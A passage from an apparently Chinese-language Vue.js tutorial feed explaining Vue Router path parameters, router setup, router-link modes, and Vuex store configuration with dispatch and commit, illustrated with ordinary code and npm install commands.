<p>将<a href="../nested-routes/#%e8%b7%af%e7%94%b1-query-%e4%bc%a0%e5%8f%82">嵌套路由 —— 路由 Query 传参</a>中的<code>MessageDetail</code>改为使用路径参数形式传参，其路由配置如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">VueRouter</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* about route... */</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/home&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">children</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* news route... */</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;message&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">component</span><span class="o">:</span> <span class="nx">Message</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">children</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;:id/:title&#39;</span><span class="p">,</span> <span class="c1">// 路径传参
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>              <span class="nx">component</span><span class="o">:</span> <span class="nx">MessageDetail</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>在<code>MessageDetail</code>的<code>path</code>中，使用了两个以<code>:</code>为开头的占位符（<code>:id</code>和<code>:title</code>）。<code>:</code>后是当前路径参数的名称（<code>id</code>和<code>title</code>）。</p>
<hr>
<h2 id="传递路径参数" data-numberify>传递路径参数<a class="anchor ms-1" href="#传递路径参数"></a></h2>
<p>传递路径参数的方式与传递Query参数的方式十分相同。传递路径参数也有两种方式：</p>
<ul>
<li>
<p>字符拼接：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">:to</span><span class="o">=</span><span class="s">&#34;`/home/message/${message.id}/${message.title}`&#34;</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>传入对象：与传递Query参数的方式基本相同。不同的是，传递路径参数需要配置的是<code>to</code> prop对象中<code>params</code>属性。并且传递路径参数时不能使用<code>path</code>属性指定路由，必须使用<code>name</code>来指定路由。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">:to</span><span class="o">=</span><span class="s">&#34;{
</span></span></span><span class="line"><span class="cl"><span class="s">  name: &#39;MessageDetail&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s">  params: {
</span></span></span><span class="line"><span class="cl"><span class="s">    id: message.id,
</span></span></span><span class="line"><span class="cl"><span class="s">    title: message.title,
</span></span></span><span class="line"><span class="cl"><span class="s">  },
</span></span></span><span class="line"><span class="cl"><span class="s">}&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  {{ message.title }}
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在<code>params</code>中配置传递的参数以及它们的值。<code>params</code>属性的<code>key</code>是传递的参数的名称（对应路由配置中占位符里<code>:</code>后的内容），<code>value</code>是传递的参数的值（就像Axios的<code>params</code>配置那样）。</p>
</li>
</ul>
<h2 id="接收路径参数" data-numberify>接收路径参数<a class="anchor ms-1" href="#接收路径参数"></a></h2>
<p>接收路径参数的形式与接收Query参数的形式也十分相似。在对应的路由组件实例中，使用<code>$route.params</code>来接收并获取这些路径参数。</p>
<p>接上例，在<code>MessageDetail</code>中接收并获取路径参数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">id</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$route</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">id</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">title</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$route</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">title</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>在路由实例中，通过<code>$route.params.argName</code>的形式获取路径参数的值。</p>
<blockquote>
<p>注：</p>
<p>获取路径参数的形式很固定，为了使代码更加简介、书写更加简便，可以如上使用<code>computed</code>属性来接收它们的值。当然还有其它更简便的方法。</p>
<p>路径参数需要在路由的<code>path</code>中使用占位符配置，否则Vue Router不会接收到这些路径参数。</p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue Router 入门</title>
      <link>/docs/vue/routers/introduction/</link>
      <pubDate>Sat, 23 Sep 2023 05:27:36 +0000</pubDate>
      
      <guid>/docs/vue/routers/introduction/</guid>
      <description><![CDATA[Vue.js路由（Router）允许通过不同的URL访问不同的内容。通过Vue Router，可以实现SPA（Single Page web Applicat]]></description>
      <content:encoded><![CDATA[<p>Vue.js路由（Router）允许通过不同的URL访问不同的内容。通过Vue Router，可以实现SPA（Single Page web Application，单页Web应用）。</p>
<p>SPA是指整个Web应用中，只有一个完整的页面。在点击SPA中的导航链接时，浏览器不会刷新页面，而是做页面的局部更新。Vue SPA的数据通过Ajax请求获取。</p>
<p>在使用Router之前，需要理清SPA中Route和Router之间的关系：</p>
<ul>
<li>
<p>Route：指的是SPA的路径与页面（组件）之间的一个对应关系。通常是将路径作为某条特定Route的<code>key</code>，将页面作为该Route的<code>value</code>。</p>
<blockquote>
<p>在前端路由中，Route Value指的是页面（组件）；在后端路由中，Route Value指的是Function。</p>
</blockquote>
</li>
<li>
<p>Router：指的是控制整个SPA中所有的Routes的一个角色。Router需要根据所有的Routes，通过Route Key来给出对应的Route Value。</p>
</li>
</ul>
<hr>
<h1 id="安装-vue-router" data-numberify>安装 Vue Router<a class="anchor ms-1" href="#安装-vue-router"></a></h1>
<p>在Node.js环境中安装<code>vue-router</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">npm i vue-router
</span></span></code></pre></div><p>需要注意的是，兼容Vue2的<code>vue-router@3</code>，而当前默认安装的是<code>vue-router@4</code>（适用于Vue3），如果在Vue2的环境下，就需要安装<code>vue-router@3</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">npm i vue-router@3
</span></span></code></pre></div><hr>
<h1 id="配置-router" data-numberify>配置 Router<a class="anchor ms-1" href="#配置-router"></a></h1>
<p>安装完成后，首先需要引入Vue Router：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">VueRouter</span> <span class="nx">from</span> <span class="s1">&#39;vue-router&#39;</span>  <span class="c1">// 引入 VueRouter
</span></span></span></code></pre></div><p>接着就是在Vue中应用Vue Router插件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">VueRouter</span><span class="p">)</span>  <span class="c1">// 应用 VueRouter 插件
</span></span></span></code></pre></div><p>假设现在要为两个组件<code>Home</code>和<code>About</code>配置路由，那么其Router的基本配置（配置文件可以存放在项目根目录下的<code>router/index.js</code>）如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">VueRouter</span> <span class="nx">from</span> <span class="s1">&#39;vue-router&#39;</span>  <span class="c1">// 引入 VueRouter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// 引入组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="nx">Home</span> <span class="nx">from</span> <span class="s1">&#39;../pages/Home.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">About</span> <span class="nx">from</span> <span class="s1">&#39;../pages/About.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">VueRouter</span><span class="p">)</span>  <span class="c1">// 应用 VueRouter 插件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// 创建并导出 Router
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">VueRouter</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 路由规则：
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/about&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">component</span><span class="o">:</span> <span class="nx">About</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/home&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>在<code>routes</code>中指定的每个路由规则都使用对象来定义，这个对象的<code>path</code>属性定义路由的路径，<code>component</code>属性定义该路径下路由的组件。</p>
<p>路由配置完成后，就可以将其配置在<code>main.js</code>（Vue实例）中：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">router</span> <span class="nx">from</span> <span class="s1">&#39;./router&#39;</span> <span class="c1">// 引入 Router
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">router</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>注：</p>
<ul>
<li>通常，路由组件被存放在项目根目录下的<code>pages</code>文件夹中，而一般组件通常存放在<code>components</code>。</li>
<li>使用路由切换页面时，被切换掉的路由组件，默认会被销毁。再次被切换回来时，才去重新挂载。</li>
<li>每个路由组件实例对象都有自己的<code>$route</code>属性，里面存放着组件自生的路由信息。</li>
<li>整个应用（Vue实例）中只有唯一的一个Router，可以通过路由组件实例对象的<code>$router</code>属性获取。</li>
</ul>
<hr>
<h1 id="使用-router" data-numberify>使用 Router<a class="anchor ms-1" href="#使用-router"></a></h1>
<p>将组件配置在Vue实例之后，就可以在任意组件中使用路由。使用路由时，有两个基本的组件：</p>
<ul>
<li><code>&lt;router-link&gt;</code>：在页面中展示路由链接。该组件会被Vue渲染成<code>&lt;a&gt;</code>标签。</li>
<li><code>&lt;router-view&gt;</code>：根据用户打开的路径，渲染对应的组件。可以将其放在任何地方，以适应你的布局。</li>
</ul>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">active-class</span><span class="o">=</span><span class="s">&#34;active&#34;</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/about&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  About
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">active-class</span><span class="o">=</span><span class="s">&#34;active&#34;</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/home&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  Home
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-view</span><span class="p">&gt;&lt;/</span><span class="nt">router-view</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>当点击对应的<code>&lt;router-link&gt;</code>，Vue会根据<code>&lt;router-link&gt;</code>上的<code>to</code>属性，改变应用的路径，并根据<code>to</code>属性将对应的组件渲染到<code>&lt;router-view&gt;</code>的位置上。</p>
<p><code>&lt;router-link&gt;</code>的<code>active-class</code>可以指定一个当<code>&lt;router-link&gt;</code>处于活动状态时的CSS样式。Vue会根据情况，自动将该样式应用到对应的元素中。</p>
<hr>
<h1 id="router-link-的两种模式" data-numberify>Router Link 的两种模式<a class="anchor ms-1" href="#router-link-的两种模式"></a></h1>
<p><code>&lt;router-link&gt;</code>默认是<code>push</code>模式，也就是点击<code>&lt;router-link&gt;</code>后，浏览器会将当前浏览记录<code>push</code>到当前页面的浏览历史记录栈的栈顶。也就是说，<code>push</code>模式的<code>&lt;router-link&gt;</code>可以在浏览器中保存访问历史，让当前应用可以根据历史记录前进后退。</p>
<p><code>&lt;router-link&gt;</code>还支持<code>replace</code>模式，<code>replace</code>模式就是将当前浏览记录替换历史记录栈顶的记录。</p>
<blockquote>
<p>在导航时，<code>push</code>模式会向<code>history</code>添加新记录，而<code>replace</code>模式不会。</p>
</blockquote>
<p><code>&lt;router-link&gt;</code>开启历史记录，可以在<code>&lt;router-link&gt;</code>中使用<code>v-bind</code>将<code>replace</code>设置为<code>true</code>，也就是<code>:replace=&quot;true&quot;</code>。开启<code>replace</code>可以使用简便的写法，直接在<code>&lt;router-link&gt;</code>中添加<code>replace</code>即可。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> 
</span></span><span class="line"><span class="cl">  <span class="na">replace</span>
</span></span><span class="line"><span class="cl">  <span class="na">active-class</span><span class="o">=</span><span class="s">&#34;active&#34;</span> 
</span></span><span class="line"><span class="cl">  <span class="na">to</span><span class="o">=</span><span class="s">&#34;/about&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  About
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Vuex 插件</title>
      <link>/docs/vue/vuex/</link>
      <pubDate>Fri, 22 Sep 2023 10:47:45 +0000</pubDate>
      
      <guid>/docs/vue/vuex/</guid>
      <description><![CDATA[Vuex是由Vue官方开发的一个专为Vue.js开发的状态管理库。Vuex可以集中存储管理应用的所有组件的状态，并以相应的规则保证状态以一种]]></description>
      <content:encoded><![CDATA[<p>Vuex是由Vue官方开发的一个专为Vue.js开发的<u>状态管理库</u>。Vuex可以<u>集中存储管理应用的所有组件的状态</u>，并以相应的规则保证状态以一种可预测的方式发生变化。</p>
<p>Vuex基于“单向数据流”理念：</p>
<p><picture><img class="img-fluid " alt="Vuex 单向数据流示意图" src="/docs/vue/vuex/1695380224992.png" loading="lazy" width="1280" height="866" />
</picture>

</p>
<p>Vuex的工作模式如下：</p>
<p><picture><img class="img-fluid " alt="Vuex 工作模式" src="/docs/vue/vuex/1695380408716.png" loading="lazy" width="701" height="551" />
</picture>

</p>
<p>Vuex应用的核心就是Store（仓库）。Store基本上就是一个容器，它包含着应用中大部分的状态（State）。</p>
<p>使用Vuex也可以实现任意组件间通信。但是官方在文档中提到，如果要构建一个简单的网页应用，使用Vuex可能是繁琐冗余的。</p>
<blockquote>
<p>如果应用够简单，最好不要使用Vuex。一个简单的Store模式就足够了。</p>
<p>如果需要构建一个中大型单页应用，就需要考虑如何更好地在组件外部管理状态，Vuex将会成为自然而然的选择。</p>
</blockquote>
<hr>
<h1 id="安装-vuex" data-numberify>安装 Vuex<a class="anchor ms-1" href="#安装-vuex"></a></h1>
<p>在Node.js环境下，可以运行下方命令安装Vuex：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">npm i vuex
</span></span></code></pre></div><p>但是需要注意的是，目前不指定Vuex版本的情况下，安装的是<code>vuex@4</code>，而<code>vuex@4</code>适用于Vue3，适用于Vue2的Vuex版本是<code>vuex@3</code>。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 安装适用于 Vue2 的 Vuex 3</span>
</span></span><span class="line"><span class="cl">npm i vuex@3
</span></span></code></pre></div><p>安装好后，就可以在项目中导入Vuex：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vuex</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span>
</span></span></code></pre></div><p>导入Vuex后，需要在Vue中开启Vuex插件：</p>
<pre tabindex="0"><code>Vue.use(Vuex)
</code></pre><hr>
<h1 id="配置-vuex" data-numberify>配置 Vuex<a class="anchor ms-1" href="#配置-vuex"></a></h1>
<p>Vuex的基本配置如下（Vuex配置文件可以是项目根目录下的<code>vuex/store.js</code>或<code>store/index.js</code>）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vuex</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span> <span class="c1">// 引入 Vuex
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span> <span class="c1">// 使用 Vuex
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Actions 用于响应组件中的动作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">actions</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Mutations 用于操作数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">mutations</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// State 用于存储数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">state</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Getters 用于将 State 中的数据进行加工
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">getters</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 创建并导出 Store
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">actions</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mutations</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">state</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">getters</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>创建好Store之后，需要将其导入到<code>main.js</code>中，并配置在Vue实例上：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">store</span> <span class="nx">from</span> <span class="s1">&#39;./store&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">store</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>配置好后，当前Vue实例，以及Vue实例下的所有组件，都能通过<code>this.$store</code>访问Store的API。</p>
<hr>
<h1 id="使用-store" data-numberify>使用 Store<a class="anchor ms-1" href="#使用-store"></a></h1>
<p>Store中，常用的API如下：</p>
<ul>
<li><code>$store.dispatch()</code>：将数据分发给对应的Action。</li>
<li><code>$store.commit()</code>：将数据（载荷）提交给对应的Mutation.</li>
</ul>
<p>Store中，常用的数据对象如下：</p>
<ul>
<li><code>$store.state</code>：访问State中的状态数据（可以认为是一个全局的<code>data</code>）。</li>
<li><code>$store.getters</code>：对State中的状态数据进行相应处理，并获取对应的处理结果（可以认为是一个全局的，没有Setter的<code>computed</code>）。</li>
</ul>
<h2 id="dispatch" data-numberify>dispatch<a class="anchor ms-1" href="#dispatch"></a></h2>
<p><code>$store.dispatch(actionName, data)</code>：</p>
<ul>
<li><code>actionName</code>：指定一个Action的名称，<code>String</code>类型。对应<code>store</code>配置中<code>actions</code>配置对象下的一个相同名称的方法<code>actionName()</code>。</li>
<li><code>data</code>：分发给<code>actionName()</code>的数据，任意类型。<code>actionName()</code>使用第2个形参<code>value</code>接收。</li>
</ul>
<p>每一个Action，在<code>actions</code>中都有一个与之对应的方法。在组件实例中，使用<code>$store.dispatch()</code>来将数据分发给对应的Action方法处理。每个Action都有一个唯一的<code>actionName</code>。</p>
<blockquote>
<p>通常，actionName是以小驼峰规则命名。</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">(</span><span class="s1">&#39;demoAction&#39;</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span></code></pre></div><p><code>demoAction</code>对应的Action：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">actions</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">demoAction</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* demoAction的处理逻辑... */</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>context</code>是一个上下文对象，每一个Action都会接收到这个参数。<code>context</code>封装了<code>$store</code>中的一些方法。通过<code>context</code>，可以将当前处理转发给其它Action，或是将处理提交到某个Mutation。</p>
<p><code>context</code>中封装了如下方法和对象：</p>
<ul>
<li><code>context.dispatch()</code></li>
<li><code>context.commit()</code></li>
<li><code>context.state</code></li>
<li><code>context.getters</code></li>
</ul>
<p>这些方法和对象的用法与<code>$store</code>中的相同。</p>
<blockquote>
<p><code>context</code>可以看作是一个小型的<code>$store</code>，它封装了<code>$store</code>中常用的方法和对象。使用者可以根据处理逻辑（上下文）调用<code>context</code>中的方法，所以才命名为<code>context</code>。</p>
<p>在Action中，应该将<code>context.state</code>视为只读的。因为Action的职责不是对状态进行修改，并且Vue.js devtools（Vue.js开发者工具）捕获不到Action对<code>context.state</code>的修改（尽管这些修改可能会生效），所以应该尽量避免在Action中对<code>context.state</code>的修改。</p>
</blockquote>
<p>通常情况下，Action是用来对数据进行一些校验或简单的处理，然后将数据转派给下一个Action或提交给某个Mutation。</p>
<p><code>$store.dispatch()</code>在调用时可以仅传递一个参数，也就是<code>actionName</code>。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">(</span><span class="s1">&#39;plusOne&#39;</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="commit" data-numberify>commit<a class="anchor ms-1" href="#commit"></a></h2>
<p><code>$store.commit(mutationName, payload)</code>：</p>
<ul>
<li><code>mutationName</code>：指定一个Mutation的名称（事件类型），<code>String</code>类型。对应<code>store</code>配置中<code>mutations</code>配置对象下的一个相同名称的方法<code>mutationName()</code>。</li>
<li><code>payload</code>：提交给<code>mutationName()</code>的数据（载荷），任意类型。<code>mutationName()</code>使用第2个形参<code>value</code>接收。</li>
</ul>
<blockquote>
<p>通常，mutationName是以全大写+下划线规则命名。</p>
</blockquote>
<p><code>$store.commit()</code>的用法和<code>$store.dispatch()</code>十分相似，不同的是<code>$store.commit()</code>是将载荷提交给某个Mutation。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="s1">&#39;demoMutation&#39;</span><span class="p">,</span> <span class="nx">payload</span><span class="p">)</span>
</span></span></code></pre></div><p><code>demoMutation</code>对应的Mutation：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">mutations</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
